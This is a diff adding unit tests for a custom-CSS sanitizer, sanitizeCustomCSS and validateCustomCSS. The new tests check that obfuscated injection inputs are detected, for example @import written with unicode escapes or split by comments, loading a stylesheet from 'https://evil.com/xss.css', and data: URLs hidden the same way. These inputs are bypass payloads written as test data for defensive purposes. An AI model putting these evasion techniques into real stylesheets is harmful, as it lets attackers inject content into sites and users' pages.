@@ -62,6 +62,50 @@ describe("sanitizeCustomCSS", () => {
     const result = sanitizeCustomCSS(css);
     expect(result.sanitized).toBe(css);
   });
+
+  // Unicode escape bypass tests
+  it("detects @import via CSS unicode escapes", () => {
+    // \\69 = 'i' in CSS unicode escapes
+    const css = "@\\69mport url('https://evil.com/xss.css');";
+    const result = sanitizeCustomCSS(css);
+    expect(result.warnings.some((w) => w.includes("@import"))).toBe(true);
+  });
+
+  it("detects data: URL via CSS unicode escapes", () => {
+    // \\64 followed by a space terminates the escape → 'd', then 'ata:' → 'data:'
+    const css = ".x { background: url(\\64 ata:text/css;base64,abc); }";
+    const result = sanitizeCustomCSS(css);
+    expect(result.warnings.some((w) => w.includes("data:"))).toBe(true);
+  });
+
+  // CSS comment bypass tests
+  it("detects @import hidden behind CSS comments", () => {
+    const css = "@im/**/port url('https://evil.com/xss.css');";
+    const result = sanitizeCustomCSS(css);
+    expect(result.warnings.some((w) => w.includes("@import"))).toBe(true);
+  });
+
+  it("detects data: URL hidden behind CSS comments", () => {
+    const css = ".x { background: url(/**/data:image/svg+xml,...); }";
+    const result = sanitizeCustomCSS(css);
+    expect(result.warnings.some((w) => w.includes("data:"))).toBe(true);
+  });
+
+  // Repeated calls should not have stale regex state
+  it("works correctly on repeated calls", () => {
+    const dangerous = '@import url("evil.css");';
+    const safe = ".rw-widget { color: blue; }";
+
+    const r1 = sanitizeCustomCSS(dangerous);
+    expect(r1.warnings.length).toBeGreaterThan(0);
+
+    const r2 = sanitizeCustomCSS(safe);
+    expect(r2.warnings).toHaveLength(0);
+    expect(r2.sanitized).toBe(safe);
+
+    const r3 = sanitizeCustomCSS(dangerous);
+    expect(r3.warnings.length).toBeGreaterThan(0);
+  });
 });
 
 describe("validateCustomCSS", () => {
@@ -97,5 +141,21 @@ describe("validateCustomCSS", () => {
   it("warns when exceeding character limit", () => {
     const warnings = validateCustomCSS("a".repeat(5001));
     expect(warnings.some((w) => w.includes("5000"))).toBe(true);
+  });
+
+  it("detects obfuscated @import via unicode escapes", () => {
+    const warnings = validateCustomCSS("@\\69mport url('evil.css');");
+    expect(warnings.some((w) => w.includes("@import"))).toBe(true);
+  });
+
+  it("works correctly on repeated calls without stale state", () => {
+    const w1 = validateCustomCSS('@import url("evil.css");');
+    expect(w1.length).toBeGreaterThan(0);
+
+    const w2 = validateCustomCSS(".safe { color: red; }");
+    expect(w2).toHaveLength(0);
+
+    const w3 = validateCustomCSS('@import url("evil.css");');
+    expect(w3.length).toBeGreaterThan(0);
   });
 });
